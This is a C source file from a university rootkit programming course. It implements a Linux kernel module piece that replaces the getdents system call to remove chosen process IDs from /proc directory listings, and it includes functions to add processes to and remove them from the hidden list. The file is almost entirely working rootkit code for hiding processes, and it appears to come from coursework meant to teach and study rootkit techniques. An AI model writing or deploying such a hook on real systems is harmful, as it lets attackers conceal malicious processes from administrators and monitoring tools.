
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 3                                                             */
/*                                                                             */
/*   Filename: process_masker.c                                                */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_getdents */
#include <linux/namei.h>		/* Needed for kern_path & LOOKUP_FOLLOW */
#include <linux/ctype.h>
#include <linux/slab.h>

#include "process_masking.h"


/* Function that replaces the original getdents syscall. In addition to what
   getdents does, additionally it ...  */
asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
	int nread;
	int nread_temp;
	int pid;
	char *endptr;

	/* Call original getdents_syscall */
	nread = original_getdents_syscall(fd, dirp, count);

	if (dirp->d_ino != proc_ino)
		return nread;

	nread_temp = nread;

	while (nread_temp > 0) {
		nread_temp -= dirp->d_reclen;

		pid = simple_strtol(dirp->d_name, &endptr, 10);
		if (pid && process_is_hidden(pid)) {
			printk(KERN_INFO "process_masker rootkit: hiding PID %d\n", pid);
			memmove(dirp, (char *) dirp + dirp->d_reclen, nread_temp);
			nread -= dirp->d_reclen;
			continue;
		}

		if (nread_temp == 0)
			return nread;

		dirp = (struct linux_dirent *) ((char *) dirp + dirp->d_reclen);
	}

	return nread;
}


/* Function that gets the inode number of the file found under specified path */
unsigned long get_inode_no(char *path_name)
{
	unsigned long inode_no;
	struct path path;
	struct inode *inode;

	inode_no = -1;

    kern_path(path_name, LOOKUP_FOLLOW, &path);
    inode = path.dentry->d_inode;
	inode_no = inode->i_ino;

	return inode_no;
}


int process_is_hidden(int pid)
{
	struct process *cur;
	struct list_head *cursor;

	list_for_each(cursor, &processes) {
		cur = list_entry(cursor, struct process, list);
		if (cur->pid == pid)
			return 1;
	}

	return 0;
}

void mask_process(int pid)
{
	struct process *new;
	
	if (process_is_hidden(pid)) {
		return;
	}

	new = kmalloc(sizeof(struct process), GFP_KERNEL);
	if (new == NULL)
		return;
	
	new->pid = pid;
	list_add(&new->list, &processes);	
}

void unmask_process(int pid)
{
	struct process *cur;
	struct list_head *cursor, *next;

	list_for_each_safe(cursor, next, &processes) {
		cur = list_entry(cursor, struct process, list);
		if(cur->pid == pid) {
			list_del(cursor);
			kfree(cur);
			return;
		}
	}
}

